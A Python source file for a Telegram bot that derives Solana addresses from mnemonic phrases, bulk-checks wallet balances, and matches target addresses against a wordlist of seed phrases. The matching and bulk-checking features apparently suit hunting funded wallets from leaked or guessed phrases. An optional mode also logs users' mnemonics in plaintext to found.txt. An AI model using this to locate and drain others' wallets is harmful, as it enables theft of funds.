#!/usr/bin/env python3
import logging
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters,
    ContextTypes, ConversationHandler
)
from telegram.error import TelegramError
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip32Slip10Ed25519
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from functools import wraps
import base58
from solana.rpc.async_api import AsyncClient
from spl.token.async_client import AsyncToken
from spl.token.instructions import get_associated_token_address
from datetime import datetime

# ---------------------------
# Basic configuration & safety
# ---------------------------
# Use environment variables for secrets
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_BOT_TOKEN:
    raise RuntimeError("Missing TELEGRAM_BOT_TOKEN environment variable. Export it and restart the bot.")

# By default do NOT persist mnemonics. Set SAVE_MNEMONICS=true to enable (not recommended).
SAVE_MNEMONICS = os.getenv("SAVE_MNEMONICS", "false").lower() in ("1", "true", "yes")

# Logging: Info-level but avoid logging sensitive bytes/seeds.
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------------------------
# Solana RPC client (async)
# ---------------------------
# Keep the default public mainnet RPC unless you have your own endpoint.
SOLANA_RPC_URL = os.getenv("SOLANA_RPC_URL", "https://api.mainnet-beta.solana.com")
client = AsyncClient(SOLANA_RPC_URL)

# ---------------------------
# Conversation states
# ---------------------------
PHRASE_A, PHRASE_B, DEDUPLICATE, REMOVE_COMMON_A, REMOVE_COMMON_B = range(5)
ADDRESS_INPUT, MNEMONIC_INPUT, GENERATE_PHRASES, BALANCE_INPUT, TOKEN_INPUT = range(5, 10)

# ---------------------------
# Processing state manager
# ---------------------------
class ProcessingState:
    def __init__(self):
        self.tasks = {}
        self.stop_flags = {}
        self.results = {}
        self.lock = asyncio.Lock()

    async def start_processing(self, chat_id: int, task: asyncio.Task):
        async with self.lock:
            self.tasks[chat_id] = task
            self.stop_flags[chat_id] = False
            self.results[chat_id] = ([], 0.0)

    async def request_stop(self, chat_id: int):
        async with self.lock:
            self.stop_flags[chat_id] = True

    async def is_stopped(self, chat_id: int) -> bool:
        async with self.lock:
            return self.stop_flags.get(chat_id, False)

    async def add_result(self, chat_id: int, line: str, balance: float):
        async with self.lock:
            results, total = self.results.get(chat_id, ([], 0.0))
            results.append(line)
            total += balance
            self.results[chat_id] = (results, total)

    async def get_results(self, chat_id: int) -> tuple:
        async with self.lock:
            return self.results.get(chat_id, ([], 0.0))

    async def cleanup(self, chat_id: int):
        async with self.lock:
            self.tasks.pop(chat_id, None)
            self.stop_flags.pop(chat_id, None)
            self.results.pop(chat_id, None)

state_manager = ProcessingState()

# ---------------------------
# Helpers: restricted decorator (noop to allow all users)
# ---------------------------
def restricted(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        return await func(*args, **kwargs)
    return wrapper

# ---------------------------
# Validation utilities
# ---------------------------
def is_valid_solana_address(address: str) -> bool:
    try:
        decoded = base58.b58decode(address)
        if len(decoded) != 32:
            return False
        Pubkey.from_bytes(decoded)
        return True
    except Exception:
        return False

def is_valid_mnemonic(mnemonic: str) -> bool:
    try:
        mn = Mnemonic("english")
        return mn.check(mnemonic)
    except Exception:
        return False

# ---------------------------
# Derive Solana address from mnemonic
# ---------------------------
def derive_sol_address(mnemonic: str) -> str:
    try:
        mn = Mnemonic("english")
        if not mn.check(mnemonic):
            raise ValueError("Invalid mnemonic")
        # Bip39 -> seed (the mnemonic.to_seed returns bytes)
        seed = mn.to_seed(mnemonic)
        # Derive with BIP32-Ed25519 (same derivation path you used)
        bip32 = Bip32Slip10Ed25519.FromSeed(seed)
        derived = bip32.DerivePath("m/44'/501'/0'/0'")
        # Private key extraction
        private_key = derived.PrivateKey().Raw().ToBytes()[:32]
        keypair = Keypair.from_seed(private_key)
        pubkey_bytes = bytes(keypair.pubkey())
        address = str(Pubkey(pubkey_bytes))
        return address
    except Exception as e:
        logger.debug(f"derive_sol_address error: {e}")
        return ""

# ---------------------------
# File persistence (OPTIONAL & DANGEROUS)
# ---------------------------
def append_to_found_file(phrases: list, username: str):
    """
    Persist phrases to found.txt with username & timestamp only if SAVE_MNEMONICS is enabled.
    WARNING: This stores mnemonic phrases in plaintext. Avoid enabling unless you understand
    the security implications.
    """
    if not SAVE_MNEMONICS:
        return

    try:
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        with open('found.txt', 'a', encoding='utf-8') as f:
            for phrase in phrases:
                if phrase.strip():
                    f.write(f"{username} | {timestamp} | {phrase}\n")
        logger.info(f"Appended {len(phrases)} phrases to found.txt")
    except Exception as e:
        logger.error(f"Error appending to found.txt: {e}")

# ---------------------------
# Balance utilities
# ---------------------------
async def get_token_balance(wallet_address: str, token_mint_address: str) -> float:
    """
    Returns UI token amount for the associated token account.
    """
    try:
        ata = get_associated_token_address(Pubkey.from_string(wallet_address), Pubkey.from_string(token_mint_address))
        token_client = AsyncToken(
            conn=client,
            pubkey=Pubkey.from_string(token_mint_address),
            program_id=Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            payer=Keypair()  # dummy
        )
        balance_resp = await token_client.get_balance(ata)
        # get_balance response has .value.ui_amount in many clients; fallback to 0
        return getattr(balance_resp.value, "ui_amount", 0) or 0
    except Exception as e:
        logger.error(f"Error fetching token balance for {wallet_address}: {e}")
        return 0.0

async def check_sol_balance(wallet_address: str) -> float:
    try:
        balance_resp = await client.get_balance(Pubkey.from_string(wallet_address))
        return getattr(balance_resp, "value", 0) / 1e9
    except Exception as e:
        logger.error(f"Error getting SOL balance for {wallet_address}: {e}")
        return 0.0

def mask_address(address: str) -> str:
    if len(address) < 10:
        return address
    return f"{address[:5]}****{address[-5:]}"

# ---------------------------
# Input/Output helpers
# ---------------------------
async def get_input_lines(update: Update) -> list:
    """
    Read lines either from uploaded .txt Document or from message text.
    Returns list of non-empty stripped lines.
    """
    if update.message and update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{update.message.document.file_name}"
        await file.download_to_drive(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            os.remove(file_path)
            logger.debug(f"Deleted temp input file: {file_path}")
            return lines
        except Exception as e:
            logger.error(f"Error reading file: {e}")
            if update.message:
                await update.message.reply_text("❌ Error reading file. Please ensure it's a valid .txt file.")
            return []
    else:
        if not update.message or not update.message.text:
            return []
        return [line.strip() for line in update.message.text.strip().splitlines() if line.strip()]

async def send_output(update: Update, result_text: str, filename: str, chat_id: int = None, bot_instance=None):
    """
    Send small text directly, otherwise send as a document and delete local file afterwards.
    """
    if chat_id is None:
        if update and update.message:
            chat_id = update.message.chat_id
        elif update and update.callback_query:
            chat_id = update.callback_query.message.chat_id

    if not chat_id:
        logger.error("No chat_id available for sending output")
        return

    if bot_instance is None:
        if update and update.get_bot():
            bot_instance = update.get_bot()
        else:
            logger.error("No bot instance available for sending output")
            return

    lines = result_text.strip().splitlines()
    if len(lines) <= 10 and len(result_text) < 4000:
        await bot_instance.send_message(chat_id=chat_id, text=f"✅ Result:\n\n{result_text}")
    else:
        safe_name = filename.replace("/", "_")
        output_file = f"output_{safe_name}.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(result_text)
        with open(output_file, 'rb') as f:
            await bot_instance.send_document(chat_id=chat_id, document=f, filename=output_file)
        os.remove(output_file)
        logger.debug(f"Deleted output file: {output_file}")

# ---------------------------
# Bot command handlers
# ---------------------------
@restricted
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
    """
Welcome to Wallet Tools Bot 🛠️

/generate_addresses – Convert mnemonic phrases to Solana addresses 
/send a list of mnemonics (one per line) or upload a .txt file

/check_balances – Check SOL or token balances for wallets
/send list of mnemonics or addresses (one per line) or upload a .txt file

/extract_phrases – Match addresses to their corresponding mnemonics
/remove_common – Remove phrases in list B from list A
/deduplicate – Remove duplicate phrases from a list

Note: This bot does NOT store your mnemonics by default. To change that behavior set the SAVE_MNEMONICS env var (not recommended).
    """
    )

@restricted
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
Available commands:
/generate_addresses – Convert mnemonic phrases to Solana addresses
/extract_phrases – Match addresses to their corresponding mnemonics
/remove_common – Remove phrases in list B from list A
/deduplicate – Remove duplicate phrases from a list
/check_balances – Check SOL or token balances for wallets
    """)

# generate_addresses
@restricted
async def generate_addresses(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send mnemonics (one per line) or upload a .txt file:")
    return GENERATE_PHRASES

async def handle_generate_phrases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mnemonics = await get_input_lines(update)
    if not mnemonics:
        await update.message.reply_text("❌ No valid input received.")
        return ConversationHandler.END

    username = update.message.from_user.username or update.message.from_user.first_name or "unknown"
    append_to_found_file(mnemonics, username)

    addresses = []
    for phrase in mnemonics:
        addr = derive_sol_address(phrase)
        if addr:
            addresses.append(addr)
        else:
            addresses.append("Invalid mnemonic / derivation failed")

    result_text = '\n'.join(addresses)
    await send_output(update, result_text, "addresses")
    return ConversationHandler.END

# extract_phrases
@restricted
async def extract_phrases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📥 Send the list of target addresses (one per line) or upload a .txt file:")
    return ADDRESS_INPUT

async def handle_address_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    addresses = await get_input_lines(update)
    if not addresses:
        await update.message.reply_text("❌ No valid addresses received.")
        return ConversationHandler.END
    context.user_data['target_addresses'] = addresses
    await update.message.reply_text("✅ Address list received.\nNow send the wordlist of phrases (one per line) or upload a .txt file:")
    return MNEMONIC_INPUT

async def handle_mnemonic_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mnemonics = await get_input_lines(update)
    if not mnemonics:
        await update.message.reply_text("❌ No valid mnemonics received.")
        return ConversationHandler.END

    username = update.message.from_user.username or update.message.from_user.first_name or "unknown"
    append_to_found_file(mnemonics, username)

    target_addresses = context.user_data.get('target_addresses', [])
    result_lines = []

    for addr in target_addresses:
        found = False
        for idx, mnemonic in enumerate(mnemonics, start=1):
            derived_address = derive_sol_address(mnemonic)
            if derived_address == addr:
                result_lines.append(f"input address: {addr}")
                result_lines.append(f"index in wordlist: {idx}")
                result_lines.append(f"found phrase key: {mnemonic}")
                found = True
                break
        if not found:
            result_lines.append(f"input address: {addr}")
            result_lines.append("index in wordlist: Not Found")
            result_lines.append("found phrase key: Not Found")
        result_lines.append("")

    result_text = '\n'.join(result_lines).rstrip()
    chat_id = update.message.chat_id
    bot = update.get_bot()

    if len(target_addresses) <= 10 and len(result_text) < 4000:
        await bot.send_message(chat_id=chat_id, text=f"✅ Result:\n\n{result_text}")
    else:
        output_file = "output_extracted_phrases.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(result_text)
        with open(output_file, 'rb') as f:
            await bot.send_document(chat_id=chat_id, document=f, filename=output_file)
        os.remove(output_file)

    return ConversationHandler.END

# remove_common
@restricted
async def remove_common(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send content for Phrase A (one per line) or upload a .txt file:")
    return REMOVE_COMMON_A

async def handle_phrase_a(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrases_a = await get_input_lines(update)
    if not phrases_a:
        await update.message.reply_text("❌ No valid input received for Phrase A.")
        return ConversationHandler.END
    context.user_data['phrase_a'] = phrases_a
    await update.message.reply_text("✅ Phrase A received.\nNow send content for Phrase B (one per line) or upload a .txt file:")
    return REMOVE_COMMON_B

async def handle_phrase_b(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrases_b = set(await get_input_lines(update))
    if not phrases_b:
        await update.message.reply_text("❌ No valid input received for Phrase B.")
        return ConversationHandler.END
    phrases_a = context.user_data.get('phrase_a', [])
    result = [line for line in phrases_a if line and line not in phrases_b]
    result_text = '\n'.join(result)
    await send_output(update, result_text, "unique_phrases")
    return ConversationHandler.END

# deduplicate
@restricted
async def deduplicate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send content to deduplicate (one per line) or upload a .txt file:")
    return DEDUPLICATE

async def save_and_deduplicate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = await get_input_lines(update)
    if not text:
        await update.message.reply_text("❌ No valid input received.")
        return ConversationHandler.END
    seen = set()
    unique = []
    for line in text:
        if line and line not in seen:
            seen.add(line)
            unique.append(line)
    result_text = '\n'.join(unique)
    await send_output(update, result_text, "deduplicated")
    return ConversationHandler.END

# check balances
@restricted
async def check_balances(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send list of mnemonics or wallet addresses (one per line) or upload a .txt file:")
    return BALANCE_INPUT

async def handle_balance_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inputs = await get_input_lines(update)
    if not inputs:
        await update.message.reply_text("❌ No valid input received.")
        return ConversationHandler.END

    addresses = []
    invalid_inputs = []
    username = update.message.from_user.username or update.message.from_user.first_name or "unknown"

    # Heuristic: typical Solana address length is not 44 words; here we check string length
    # If first line is not 44 characters long, treat as mnemonic list (common case)
    if inputs and len(inputs[0].strip()) != 44:
        mnemonics = inputs
        append_to_found_file(mnemonics, username)
        for mnemonic in mnemonics:
            derived = derive_sol_address(mnemonic)
            if derived:
                addresses.append(derived)
            else:
                invalid_inputs.append(mnemonic)
    else:
        for inp in inputs:
            inp = inp.strip()
            if is_valid_solana_address(inp):
                addresses.append(inp)
            else:
                invalid_inputs.append(inp)

    if not addresses:
        error_message = "❌ No valid addresses or mnemonics provided."
        if invalid_inputs:
            error_message += f"\nInvalid inputs:\n" + "\n".join(invalid_inputs[:5])
        await update.message.reply_text(error_message)
        return ConversationHandler.END

    context.user_data['balance_inputs'] = addresses

    if invalid_inputs:
        await update.message.reply_text(
            f"⚠️ {len(invalid_inputs)} invalid inputs were skipped:\n" +
            "\n".join(invalid_inputs[:5]) +
            ("\n...and more" if len(invalid_inputs) > 5 else "")
        )

    keyboard = [[InlineKeyboardButton("SOL", callback_data="select_sol")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"✅ {len(addresses)} valid addresses received.\nSend the token address or click the 'SOL' button for SOL balance:",
        reply_markup=reply_markup
    )
    return TOKEN_INPUT

async def handle_token_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token_input = await get_input_lines(update)
    if not token_input or len(token_input) != 1:
        await update.message.reply_text("❌ Please provide exactly one valid token address or select 'SOL'.")
        return TOKEN_INPUT

    token_address = token_input[0].strip()
    addresses = context.user_data.get('balance_inputs', [])
    if not addresses:
        await update.message.reply_text("❌ No valid addresses to process.")
        return ConversationHandler.END

    chat_id = update.message.chat_id
    context.user_data['token_address'] = token_address
    context.user_data['chat_id'] = chat_id

    task = asyncio.create_task(process_wallets(chat_id, addresses, token_address, update.get_bot(), context))
    await state_manager.start_processing(chat_id, task)
    context.user_data['processing_task'] = task

    return ConversationHandler.END

async def process_wallets(chat_id: int, addresses: list, token_address: str, bot, context: ContextTypes.DEFAULT_TYPE):
    total_wallets = len(addresses)
    update_interval = max(5, total_wallets // 10)

    try:
        initial_status_message = await bot.send_message(
            chat_id=chat_id,
            text="⏳ Starting balance check... This might take a moment.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Stop", callback_data="stop_processing")]])
        )
        context.user_data['status_message_id'] = initial_status_message.message_id
        context.user_data['chat_id'] = chat_id

        for i, address in enumerate(addresses):
            if await state_manager.is_stopped(chat_id):
                break

            logger.debug(f"Processing wallet {i+1}/{total_wallets}: {mask_address(address)}")
            if not is_valid_solana_address(address):
                line = f"{str(i+1).zfill(6)}. {address}: Invalid Address"
                await state_manager.add_result(chat_id, line, 0.0)
                continue

            try:
                if token_address.upper() == 'SOL':
                    balance = await check_sol_balance(address)
                    line = f"{str(i+1).zfill(6)}. {address}: {balance} SOL"
                else:
                    balance = await get_token_balance(address, token_address)
                    line = f"{str(i+1).zfill(6)}. {address}: {balance} tokens"
                await state_manager.add_result(chat_id, line, balance)
            except Exception as e:
                logger.error(f"Error processing wallet {i+1}: {e}")
                line = f"{str(i+1).zfill(6)}. {address}: Error"
                await state_manager.add_result(chat_id, line, 0.0)

            if i % update_interval == 0 or i == total_wallets - 1 or await state_manager.is_stopped(chat_id):
                result_lines, total_balance = await state_manager.get_results(chat_id)
                unit = "SOL" if token_address.upper() == "SOL" else "tokens"
                display_lines = []
                for line in result_lines[-10:]:
                    # safe parsing to avoid leaking too much
                    try:
                        idx_part, rest = line.split(". ", 1)
                        addr_part, bal_part = rest.split(": ", 1)
                        display_lines.append(f"{idx_part}. {mask_address(addr_part)}: {bal_part}")
                    except Exception:
                        display_lines.append(line)
                current_text = "\n".join(display_lines)
                current_text += f"\n\nRunning total: {total_balance} {unit}"
                if len(result_lines) < total_wallets and not await state_manager.is_stopped(chat_id):
                    current_text += f"\n⏳ Processing wallet {i+2}/{total_wallets}..."

                try:
                    status_message_id = context.user_data.get('status_message_id')
                    if status_message_id:
                        await bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=status_message_id,
                            text=current_text,
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Stop", callback_data="stop_processing")]])
                        )
                except TelegramError as e:
                    logger.debug(f"Error updating status message: {e}")
                    try:
                        status_message = await bot.send_message(
                            chat_id=chat_id,
                            text=current_text,
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Stop", callback_data="stop_processing")]])
                        )
                        context.user_data['status_message_id'] = status_message.message_id
                    except TelegramError as e:
                        logger.error(f"Error sending new status message fallback: {e}")

            await asyncio.sleep(0.01)

        result_lines, total_balance = await state_manager.get_results(chat_id)
        unit = "SOL" if token_address.upper() == "SOL" else "tokens"
        result_lines.append(f"\nTotal {unit} balance: {total_balance}")
        result_text = '\n'.join(result_lines)
        status_text_final = "🛑 Processing stopped. Sending partial results..." if await state_manager.is_stopped(chat_id) else "✅ Processing complete! Sending results..."

        status_message_id = context.user_data.get('status_message_id')
        if status_message_id:
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message_id,
                    text=status_text_final,
                    reply_markup=None
                )
                await asyncio.sleep(0.5)
                await bot.delete_message(chat_id=chat_id, message_id=status_message_id)
            except TelegramError as e:
                logger.debug(f"Error updating/deleting status message: {e}")

        dummy_update = Update(update_id=0)
        await send_output(dummy_update, result_text, f"{'partial_' if await state_manager.is_stopped(chat_id) else ''}balances_{token_address}", chat_id=chat_id, bot_instance=bot)

    except asyncio.CancelledError:
        result_lines, total_balance = await state_manager.get_results(chat_id)
        unit = "SOL" if token_address.upper() == "SOL" else "tokens"
        if result_lines:
            result_lines.append(f"\nTotal {unit} balance: {total_balance}")
            result_text = '\n'.join(result_lines)
        else:
            result_text = "No wallets processed before stopping."

        status_message_id = context.user_data.get('status_message_id')
        if status_message_id:
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message_id,
                    text="🛑 Processing stopped. Sending partial results...",
                    reply_markup=None
                )
                await asyncio.sleep(0.5)
                await bot.delete_message(chat_id=chat_id, message_id=status_message_id)
            except TelegramError as e:
                logger.debug(f"Error updating/deleting status message after cancellation: {e}")

        dummy_update = Update(update_id=0)
        await send_output(dummy_update, result_text, f"partial_balances_{token_address}", chat_id=chat_id, bot_instance=bot)
        raise
    finally:
        await state_manager.cleanup(chat_id)

# Callback to select SOL
async def select_sol(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    token_address = 'SOL'
    addresses = context.user_data.get('balance_inputs', [])

    if not addresses:
        await query.message.reply_text("❌ No valid addresses to process.")
        try:
            await query.message.delete()
        except TelegramError:
            pass
        context.user_data.clear()
        return ConversationHandler.END

    chat_id = query.message.chat_id
    context.user_data['token_address'] = token_address
    context.user_data['chat_id'] = chat_id

    try:
        await query.message.delete()
    except TelegramError:
        pass

    task = asyncio.create_task(process_wallets(chat_id, addresses, token_address, update.get_bot(), context))
    await state_manager.start_processing(chat_id, task)
    context.user_data['processing_task'] = task
    return ConversationHandler.END

# Stop processing
async def stop_processing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    if await state_manager.is_stopped(chat_id):
        return
    await state_manager.request_stop(chat_id)
    task = context.user_data.get('processing_task')
    if task and not task.done():
        task.cancel()
    return ConversationHandler.END

# Global error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and (update.message or update.callback_query):
        chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
        try:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ An error occurred. Please try again or contact support.")
        except TelegramError:
            logger.debug("Failed to send error notice to user.")

# ---------------------------
# App setup & run
# ---------------------------
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("generate_addresses", generate_addresses)],
        states={GENERATE_PHRASES: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_generate_phrases)]},
        fallbacks=[]
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("extract_phrases", extract_phrases)],
        states={
            ADDRESS_INPUT: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_address_input)],
            MNEMONIC_INPUT: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_mnemonic_input)]
        },
        fallbacks=[]
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("remove_common", remove_common)],
        states={
            REMOVE_COMMON_A: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_phrase_a)],
            REMOVE_COMMON_B: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_phrase_b)]
        },
        fallbacks=[]
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("deduplicate", deduplicate)],
        states={DEDUPLICATE: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, save_and_deduplicate)]},
        fallbacks=[]
    ))

    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("check_balances", check_balances)],
        states={
            BALANCE_INPUT: [MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_balance_input)],
            TOKEN_INPUT: [
                MessageHandler((filters.TEXT | filters.Document.TEXT) & ~filters.COMMAND, handle_token_input),
                CallbackQueryHandler(select_sol, pattern="select_sol")
            ]
        },
        fallbacks=[CallbackQueryHandler(stop_processing, pattern="stop_processing")]
    ))

    app.add_error_handler(error_handler)

    logger.info("Bot starting...")
    app.run_polling()

if __name__ == '__main__':
    main()
